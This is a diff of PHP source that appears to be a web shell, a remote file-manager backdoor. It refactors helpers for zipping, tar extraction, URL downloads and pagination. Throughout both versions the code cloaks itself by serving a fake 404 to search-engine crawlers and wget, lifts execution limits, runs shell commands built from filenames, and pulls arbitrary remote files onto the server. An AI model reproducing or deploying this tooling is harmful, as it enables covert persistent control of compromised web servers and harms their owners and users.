@@ -20,20 +20,20 @@ define('SROOT', dirname(__file__) . DS);
 @ini_alter('allow_url_fopen', 1);
 
 @error_reporting(7);
-@ini_set('memory_limit', '128M'); //change it if phpzip fails
+@ini_set('memory_limit', '64M'); //change it if phpzip fails
 @set_magic_quotes_runtime(0);
 @set_time_limit(0);
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 
 $uAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Yahoo', 'Zeus', 'bot', 'Wget');
-if (empty($_SERVER['HTTP_USER_AGENT']) || preg_match('/' . implode('|', $uAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $uAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))){
     header('HTTP/1.0 404 Not Found');
     exit;
 }
 
 if (in_array($config['charset'], array('utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'))) 
-	header("Content-Type: text/html; charset={$config['charset']}");
+	header("Content-Type: text/html; charset=$config[charset]");
 
 function mHide($n, $v){
 	return "<input id='$n' name='$n' type='hidden' value='$v' />";
@@ -45,66 +45,47 @@ function mLink($t, $o, $e = '', $m = true){
 }
 
 function mInput($n, $v, $tt = '', $nl = '', $c = '', $e = ''){
-	if ($tt !== '') $tt = "$tt<br>";
-
-	$input = "$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e />";
-	if ($nl !== '')	$input = "<p>$input</p>";
-		
-	return $input;
+	if ($tt !== '') $tt = "$tt<br>"; 
+	if ($nl !== '')
+		return "<p>$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e /></p>";
+	else
+		return "$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e />";
 }
 
 function mSubmit($v, $o, $nl = '', $e = ''){
-	$input = "<input class='button' type='button' value='$v' onclick='$o;return false;' $e >";
-	if ($nl !== '') $input = "<p>$input</p>";
-	
-	return $input;
+	if ($nl !== '')
+		return "<p><input class='button' type='button' value='$v' onclick='$o;return false;' $e ></p>";
+	else
+		return "<input class='button' type='button' value='$v' onclick='$o;return false;' $e >";
 }
 
 function mSelect($n, $v, $nk = false, $s = false, $o = false, $t = false, $nl = false, $e = false){
 	$tmp = '';
 	if ($o) $o = "onchange='$o'";
 	if ($t) $t = "$t<br>";
-	foreach ($v as $key => $value){
-		if ($nk) $key = $value;
-		$tmp .= "<option value='$key'" . ($s == $key ? " selected='selected'" : "") . ">$value</option>";
+	if ($nk){
+		foreach ($v as $value){
+			if ($s == $value)
+				$tmp .= "<option value='$value' selected='selected'>$value</option>";
+			else 
+				$tmp .= "<option value='$value'>$value</option>";
+		}
+	} else {
+		foreach ($v as $key=>$value){
+			if ($s == $value)
+				$tmp .= "<option value='$key' selected='selected'>$value</option>";
+			else 
+				$tmp .= "<option value='$key'>$value</option>";
+		}
 	}
-
 	$tmp = "$t<select class='theme' id='$n' name='$n' $o $e>$tmp</select>";
-	if ($nl) 
-		$tmp = "<p>$tmp</p>";
-	
+	if ($nl) $tmp = "<p>$tmp</p>";
 	return $tmp;
 }
 
 function mCheck($n, $v, $o = '', $c = false){
 	return "<input id='$n' name='$n' value='$v' type='checkbox' onclick='$o' " . ($c ? 'checked' : '') . "/>";
 }
-
-function genPaginator($c, $t = -1, $fm = true) {
-	global $p;
-	
-	$l = 'dbexec(euc("' . (isset($p['code']) ? $p['code'] : '') . '") + "&pg=';
-	if ($fm)
-		$l = 'ajaxLoad("me=file&dir=" + euc(d.getElementById("base").value) + "&pg=';
-	
-	if ($t < 0)
-		$t = $c + 1;
-	
-	$tmp = '<div class="paginator">';
-	$i = 0;
-	while($i < $t) {
-		$i++;
-		if ($i < $c)
-			$tmp .= mLink($i, $l . $i . '")', 'class="prev"');
-		else if ($i == $c)
-			$tmp .= '<span class="current">' . $i . '</span>';
-		else
-			$tmp .= mLink($i . ($fm ? ' ...?' : ''), $l . $i . '")', 'class="next"');
-	}
-
-	return $tmp . '</div>';
-}
-
 
 function fix_magic_quote($arr){
 	$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
@@ -325,32 +306,14 @@ function getcfg($n){
     else return $result;
 }
 
-if (!function_exists('file_get_contents')) {
-	function file_get_contents($file){
-		$h = @fopen($file, 'rb');
-		if (!$h)
-            return false;
-
+function read_file($file){
+	$content = false;
+	if($fh = @fopen($file, 'rb')){
 		$content = '';
-		while(!feof($h))
-			$content .= fread($h, 8192);
-		
-		return $content;
+		while(!feof($fh))
+			$content .= fread($fh, 8192);
 	}
-}
-
-if (!function_exists('file_put_contents')) {
-	define('FILE_APPEND', 1);
-    function file_put_contents($file, $data, $flag = false) {
-    	$mode = ($flag == FILE_APPEND || strtoupper($flag) == 'FILE_APPEND') ? 'a' : 'w';
-        $h = @fopen($file, $mode);
-        if (!$h)
-            return false;
-        
-        $bytes = fwrite($h, $data);
-        fclose($h);
-        return $bytes;
-    }
+	return $content;
 }
 
 function sizecount($s){
@@ -371,17 +334,6 @@ function getUpPath($n){
     if ($num > 2) unset($pathdb[$num - 1], $pathdb[$num - 2]);
     $uppath = implode(DS, $pathdb) . DS;
     return $uppath;
-}
-
-function get_all_files($path){
-	$files = glob(realpath($path).DS.'*');
-	foreach ($variable as $value) {
-		if (is_dir($value)){
-			$subdir = glob($value.DS.'*');
-			if (is_array($files) && is_array($subdir)) $files = array_merge($files, $subdir);
-		}
-	}
-	return $files;
 }
 
 function sAjax($i){
@@ -421,48 +373,51 @@ function zip($files, $archive){
 	$zip->close();
 }
 
-# Based on PHPZip - v1.23 by DSR!
+//TODO: agregar posibilidad de ir dumpeando mientras se hace en lugar de en memoria
+//para poder usarlo con archivos enormes/poca memoria
+# Based on PHPZip v1.2 by DSR!
 class PHPZip {
     var $datasec = array();
     var $ctrl_dir = array();
-    var $cut_from_route = 0;
-    var $file_count = 0;
     var $old_offset = 0;
 
     function Zipper($basedir, $filelist){
-        $this->cut_from_route = strlen(dirname($basedir . $filelist[0])) + 1;
-        foreach ($filelist as $f){   
-            $f = $basedir . $f;
-            if (is_dir($f))
-                $this->AddFolderContent($f);
-            else if (is_file($f))
-                $this->addFileProc($f);
+		$cdir = dirname($basedir . $filelist[0]) . DS;
+		$cut = strlen($cdir);
+		foreach ($filelist as $f){	
+			$f = $basedir . $f;
+			if (file_exists($f)){
+				if (is_dir($f)) $sBuff = $this->GetFileList($f, $cut);
+				else if (is_file($f)){
+					$fd = fopen($f, 'r');
+					$sBuff = @fread($fd, filesize($f));
+					fclose($fd);
+					$this->addFile($sBuff, substr($f, $cut));
+				}
+			}
         }
+        $out = $this->file();
+		
+        return 1;
     }
 
-    function AddFolderContent($dir){
-        if (!file_exists($dir))
-            return false;
-           
-        $h = @opendir($dir);
-        while (false !== ($f = @readdir($h))) {
-            if ($f === '.' || $f === '..')
-                continue;
-
-            $f = $dir . $f;
-            if (is_dir($f))
-                $this->AddFolderContent($f . DS);
-            else if (is_file($f))
-                $this->addFileProc($f);
+    function GetFileList($dir, $cut){
+        if (file_exists($dir)){			
+            $h = opendir($dir);
+            while ($f = readdir($h)){
+                if (($f !== '.') && ($f !== '..')){
+                    if (is_dir($dir . $f)) $this->GetFileList($dir . $f . DS, $cut);
+                    else if (is_file($dir . $f)){
+						$fd = fopen($dir . $f, 'r');
+						$sBuff = @fread($fd, filesize($dir . $f));
+						fclose($fd);
+						$this->addFile($sBuff, substr($dir . $f, $cut));
+                    }
+                }
+            }
+            closedir($h);
         }
-        @closedir($h);
-    }
-
-    function addFileProc($file){
-        if (!file_exists($file))
-            return false;
-        
-        $this->addFile(file_get_contents($file), substr($file, $this->cut_from_route));
+        return 1;
     }
 
     function unix2DosTime($t = 0){
@@ -482,58 +437,72 @@ class PHPZip {
 	}
 
     function addFile($data, $name, $time = 0){
+		$packv0 = pack('v', 0);
         $dtime = dechex($this->unix2DosTime($time));
 		$hexdtime = $this->hex2bin($dtime[6] . $dtime[7] . $dtime[4] . $dtime[5] . $dtime[2] . $dtime[3] . $dtime[0] . $dtime[1]);
-        $packv0 = pack('v', 0);
-        $zdata = gzcompress($data);
-        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
+        $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00" . $hexdtime;
 
         // "local file header" segment
-        $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00" . $hexdtime;
-        $pack_info = pack('V', crc32($data)) . pack('V', strlen($zdata)) . pack('V', strlen($data));
-        
-        $fr .= $pack_info . pack('v', strlen($name)) . $packv0 . $name;
-        $fr .= $zdata; // "file data" segment
-        $fr .= $pack_info; // "data descriptor" segment
+        $unc_len = strlen($data);
+        $crc = crc32($data);
+        $zdata = gzcompress($data);
+        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
+        $c_len = strlen($zdata);
+        $fr .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len) . pack('v', strlen($name)) . $packv0 . $name;
+
+        // "file data" segment
+        $fr .= $zdata;
+
+        // "data descriptor" segment
+        $fr .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len);
+
+        // add this entry to array
         $this->datasec[] = $fr;
 
         // now add to central directory record
         $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00" . $hexdtime;
-        $cdrec .= $pack_info . pack('v', strlen($name)) . $packv0 . $packv0 . $packv0 . $packv0 . pack('V', 32);
-        $cdrec .= pack('V', $this->old_offset) .  $name;
+        $cdrec .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len) . pack('v', strlen($name)) . $packv0 . $packv0 . $packv0 . $packv0 . pack('V', 32);
+        $cdrec .= pack('V', $this->old_offset);
+        $this->old_offset += strlen($fr);
+        $cdrec .= $name;
 
         // save to central directory
-        $this->old_offset += strlen($fr);
-        $this->file_count += 1;
         $this->ctrl_dir[] = $cdrec;
     }
 
     function file(){
         $data = implode('', $this->datasec);
         $ctrldir = implode('', $this->ctrl_dir);
-        return $data . $ctrldir . "\x50\x4b\x05\x06\x00\x00\x00\x00" . pack('v', $this->file_count) . pack('v', $this->file_count) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "  ";
+        return $data . $ctrldir . "\x50\x4b\x05\x06\x00\x00\x00\x00" . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "  ";
     }
 
     function output($file){
-    	return file_put_contents($file, $this->file());
+        $fp = fopen($file, 'w');
+        fwrite($fp, $this->file());
+        fclose($fp);
     }
 }
 
 function compress($type, $archive, $files){
-	if (!is_array($files)) $files = array($files);
-	if ($type=='zip'){
+	if(!is_array($files)) $files = array($files);
+	if($type=='zip'){
 		if(class_exists('ZipArchive'))
 			if (zip($files, $archive)) return true;
 		else {
 			//TODO
 		}
-	} else if ($type=='tar' || $type=='targz') {
+	} else if (($type=='tar')||($type=='targz')){
 		$archive = basename($archive);
 		$listsBasename = array_map('basename', $files);
 		$lists = array_map('wrap_with_quotes', $listsBasename);
-		$command = ($type == 'targz' ? 'czf' : 'cf');
-		execute('tar '.$command.'czf "'.$archive.'" '.implode(' ', $lists));
-		return is_file($archive);
+
+		if ($type=='tar') 
+			execute('tar cf "'.$archive.'" '.implode(' ', $lists));
+		else if ($type=='targz') 
+			execute('tar czf "'.$archive.'" '.implode(' ', $lists));
+
+		if (is_file($archive)) 
+			return true;
 	}
 	return false;
 }
@@ -548,32 +517,40 @@ function decompress($type, $archive, $path){
 				$target = $path.basename($archive,'.zip');
 				if($zip->open($archive)){
 					if(!is_dir($target)) mkdir($target);
-					$zip->extractTo($target); //return true;
-					return $zip->close();
+					if($zip->extractTo($target)) return true;
+					$zip->close();
 				}
+			} else {
+				//TODO
 			}
-		} else if ($type=='tar' || $type=='targz') {
+		} else if($type=='untar'){
+			$target = basename($archive,'.tar');
+			if(!is_dir($target)) mkdir($target);
+			$before = count(get_all_files($target));
+			execute('tar xf "'.basename($archive).'" -C "'.$target.'"');
+			$after = count(get_all_files($target));
+			if($before!=$after) return true;
+		} else if($type=='untargz'){
 			$target = '';
 			if(strpos(strtolower($archive), '.tar.gz')!==false) $target = basename($archive,'.tar.gz');
 			else if(strpos(strtolower($archive), '.tgz')!==false) $target = basename($archive,'.tgz');
-			else if(strpos(strtolower($archive), '.tar')!==false) $target = basename($archive,'.tar');
-
 			if(!is_dir($target)) mkdir($target);
 			$before = count(get_all_files($target));
-			$command = ($type == 'untargz' ? 'xzf' : 'xf');
-			execute('tar '.$command.' "'.basename($archive).'" -C "'.$target.'"');
+			execute('tar xzf "'.basename($archive).'" -C "'.$target.'"');
 			$after = count(get_all_files($target));
-			return $before != $after;
+			if($before!=$after) return true;
 		}
 	}
 	return false;
 }
 
-function download($url, $save){
+function download($url ,$save){
 	if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
-	if(is_file($save)) unlink($save);
-	if($sBuff = file_get_contents($url)){
-		if(file_put_contents($save, $sBuff))
+	$filename = basename($url);
+
+	if($sBuff = read_file($url)){
+		if(is_file($save)) unlink($save);
+		if(write_file($save, $sBuff))
 			return true;
 	}
 	
@@ -636,6 +613,31 @@ function filesize64($file){
 	}
 	
 	return $size;
+}
+
+function genPaginator($c, $t = -1, $fm = true) {
+	global $p;
+	
+	$l = 'dbexec(euc("' . (isset($p['code']) ? $p['code'] : '') . '") + "&pg=';
+	if ($fm)
+		$l = 'ajaxLoad("me=file&dir=" + euc(d.getElementById("base").value) + "&pg=';
+	
+	if ($t < 0)
+		$t = $c + 1;
+	
+	$tmp = '<div class="paginator">';
+	$i = 0;
+	while($i < $t) {
+		$i++;
+		if ($i < $c)
+			$tmp .= mLink($i, $l . $i . '")', 'class="prev"');
+		else if ($i == $c)
+			$tmp .= '<span class="current">' . $i . '</span>';
+		else
+			$tmp .= mLink($i . ($fm ? ' ...?' : ''), $l . $i . '")', 'class="next"');
+	}
+
+	return $tmp . '</div>';
 }
 
 
